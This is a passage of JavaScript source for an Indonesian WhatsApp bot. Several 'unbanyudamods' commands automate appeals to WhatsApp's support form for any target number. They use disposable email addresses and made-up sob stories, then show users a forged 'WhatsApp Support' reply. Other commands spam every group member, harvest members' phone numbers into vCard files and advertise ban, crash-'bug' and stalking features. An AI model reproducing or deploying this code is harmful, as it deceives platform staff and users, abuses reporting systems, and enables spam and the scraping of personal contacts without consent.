Why was my number suddenly blocked or banned when I entered a group, Please reactivate my number because I am still a junior high school student, and there are many important groups from school and assignments are sent through that group, please reactivate my number because I really need that number for school.

Please reactivate this number: [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanyudamods4': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hello dear WhatsApp parties!
Can you please reactivate my number because suddenly my number has been blocked and I have not done anything wrong that is against the community or the rules given by WhatsApp, I beg you to reactivate this number: [${targetnya}]], because I really need this number for my business i have a lot of work in my number it is a lot of important group for me to work! Please reactivate my number, thank you very much.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanyudamods5': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Halo Dukungan WhatsApp, Saya salah Satu pengguna WhatsApp Dengan Nomor ]${targetnya} Sayangnya Akun WhatsApp saya telah Di blokir Saya Maaf Telah Menginstal Aplikasi Pihak Thard

Karena Kesalahan. Saya Meminta untuk Membuka Blokir akun Saya. Tolong Bantu Saya untuk membuka blokirnya sesegera mungkin. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanyudamods6': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hallo, saya tidak melakukan kesalahan apapun, tiba-tiba nomor saya di nonaktifkan ketika masuk ke grup maka saya mohon kepada pihak whatsapp yang terhormat, tolong aktifkan kembali nomor saya [${targetnya}]
`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanyudamods7': {
if (!TzyTheCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Nomor saya baru, dan dengan itu saya baru saja membuka industri dan di Grup ini saya sangat membutuhkan akun saya, saya tidak melanggar aturan apa pun dari kebijakan privasi, jadi saya meminta tim dukungan whatsapp mengambil tindakan sesegera mungkin agar saya dapat memiliki akses ke materi dari grup saya [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuanku🥺🙏`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case "pushcontactv2":
if (!TzyTheCreator) return khususOwner()
if (msg.isGroup) return reply(`Fitur Ini Hanya Bisa Digunakan Di Private Chat`)
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const hay = q.split("|")[1]
const groupMetadataa = !m.isGroup? await yudamods.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
yudamods.sendMessage(mem, { text: hay })
await sleep(2000)
}
reply("*SUCCESFUL ✅*")
break
case "jpm": case "post": {
if (!TzyTheCreator) return khususOwner()
if (!text) return replygcTzy(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
let getGroups = await yudamods.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await yudamods.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await yudamods.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await yudamods.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await yudamods.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL ✅*")
}
break
case "savecontact": {
if (!TzyTheCreator) return khususOwner()
if (!m.isGroup)  return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await replygcTzy("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = m.isGroup? await yudamods.groupMetadata(from).catch(e => {}) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
replygcTzy("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await yudamods.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
    case 'credit': case 'credito': case 'credits': case 'cr': {
me = m.sender
teks = `*thanks to*

> _all creator bot_
> _owner bot_
> _penyedia Rest Api_
> _penyedia Module_
> _DGTzy (sc ori)_
> _My Self (Saya Sendiri YudaMods)_
sendyudamodsMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
break
case 'bott': case 'bot?': case 'list': case 'menu': case 'bot': case '?': {
            if (!isRegistered) return replygcTzy('Kamu belum daftar! Silahkan daftar dengan cara #daftar nama|umur!')
	        let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed();
            let latensie = speed() - timestampe
            Tzyezy = `Hi, ${pushname} 👋 I am a WhatsApp bot that works using baileys v6.0.9
Hopefully you can use me wisely and well

*I N F O - B O T*

*┌ Bot Name* : *${global.botname}*
*│ Version* : *5*
*│ Running* : *${global.running}*
*│ Language* : *NodeJs*
*└ Baileys* : *@adiwashing/baileys*
 
*L I S T - M E N U*

*┌ ◦ .menuall*
*│ ◦ .menuowner*
*│ ◦ .menubug*
*│ ◦ .menuanti*
*│ ◦ .menugame*
*│ ◦ .menupush*
*└ ◦ .Credit*

found a bug?
please report the developer 
contact the owner *.owner*

Powered By *@${mark.split("@")[0]}*`
            let ments = [ownernya, me, mark]        
           yudamods.sendMessage(from, { 
text: Tzyezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender, mark],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title":wmbot, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./TzyMedia/theme/cheemspic.jpg"),
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
}, { quoted: m })
           }
           break
case 'menuall': {
     if (!isRegistered) return replygcTzy('Kamu belum daftar! Silahkan daftar dengan cara #daftar nama|umur!')
var unicorn = await getBuffer(picak+'All Menu')
sendyudamodsMessage(from, { 
text: `Hi @${sender.split("@")[0]}

*ᴏᴡɴᴇʀ ᴏɴʟʏ* = For Owner
*ɢʀᴏᴜᴘ ᴏɴʟʏ* = For Group
*ғʀᴇᴇ ᴏɴʟʏ* = For Free User
*ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ* = For Premium User

*—  O W N E R  M E N U ッ*

┌ ◦ .self *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .public *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .join *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .bctext *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .bcimage *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .bcvideo *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .creategc *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .setexif *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .shutdown *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .autostickergc *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .setppbot *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addprem *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delprem *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addowner *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delowner *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addvn *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delvn *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addsticker *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delsticker *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addimage *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delimage *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .addvideo *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .delvideo *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .block add *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .getsesi *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .backup *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .unblock del *ᴏᴡɴᴇʀ ᴏɴʟʏ*
└ ◦ .leavegc *ᴏᴡɴᴇʀ ᴏɴʟʏ*

*—  P U S H  M E N U ッ*  

┌ ◦ .pushcontact *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .pushcontactv2 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .savecontact *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .pushmember *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .idgc *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .post *ᴏᴡɴᴇʀ ᴏɴʟʏ*
└ ◦ .jpm *ᴏᴡɴᴇʀ ᴏɴʟʏ*

 *—  B U G  M E N U ッ* 
 
┌ ◦ .🥶 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .🤣 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .😂 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .😘 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .💔 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .👊 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
└ ◦ .😱 *ᴏᴡɴᴇʀ ᴏɴʟʏ*

 *—  G A M E   M E N U ッ* 
 
┌ ◦ .tebak lagu *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tebak gambar *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tebak lirik *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .family100 *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tebak kata *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .tebak lontong *ғʀᴇᴇ ᴏɴʟʏ*

 *—  A I  M E N U ッ* 
 
┌ ◦ .toanime *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ai *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .paptt *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .openai *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .removebg *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .tohd *ғʀᴇᴇ ᴏɴʟʏ*

*—  B A N N E D ッ* 

┌ ◦ .banyudamods1 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .banyudamods2 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .banyudamods3 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .banyudamods4 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .verify *ᴏᴡɴᴇʀ ᴏɴʟʏ*
└ ◦ .logout *ᴏᴡɴᴇʀ ᴏɴʟʏ*

*—  U N B A N N E D ッ*   

┌ ◦ .unbanyudamods1 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .unbanyudamods2 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .unbanyudamods3 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .unbanyudamods4 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .unbanyudamods5 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
│ ◦ .unbanyudamods6 *ᴏᴡɴᴇʀ ᴏɴʟʏ*
└ ◦ .unbanyudamods7 *ᴏᴡɴᴇʀ ᴏɴʟʏ*

*— D O W N L O A D ッ* 

┌ ◦ .tiktokvideo *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .tiktokaudio *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ytsearch *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .mediafire *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .play *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ytmp3 *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .ytmp4 *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .google *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .spotify *ғʀᴇᴇ ᴏɴʟʏ*
│ ◦ .gitclone *ғʀᴇᴇ ᴏɴʟʏ*
└ ◦ .happymod *ғʀᴇᴇ ᴏɴʟʏ*

*— A N T I  M E N U ッ*

┌ ◦ .antilinkgc *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antiwame *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkall *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinktiktok *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkfb *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinktwitter *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkig *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinktg *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkytvid *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilinkytch *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antivirus *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antitoxic *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .antilink *ɢʀᴏᴜᴘ ᴏɴʟʏ*
└ ◦ .antiwame *ɢʀᴏᴜᴘ ᴏɴʟʏ*

*— G R O U P  M E N U ッ*

┌ ◦ .grouplink *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .ephemeral *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .delete *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .setppgroup *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .setname *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .setdesc *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .add *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .kick *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .promote *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .demote *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .hidetag *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .tagall *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .editinfo *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .opentime *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .closetime *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .resetlink *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .autostickerpc *ɢʀᴏᴜᴘ ᴏɴʟʏ*
│ ◦ .nsfw *ɢʀᴏᴜᴘ ᴏɴʟʏ*
└ ◦ .react *ɢʀᴏᴜᴘ ᴏɴʟʏ*

*— R A N D O M  V I D E O ッ*

┌ ◦ .tiktokgirl *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tiktoknukthy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tiktokkayes *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tiktokpanrika *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tiktoknotnot *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tiktokghea *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .tiktoksantuy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
└ ◦ .tiktokbocil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*

*— S T A L K  M E N U ッ*

┌ ◦ .igstalk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
│ ◦ .ffstalk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
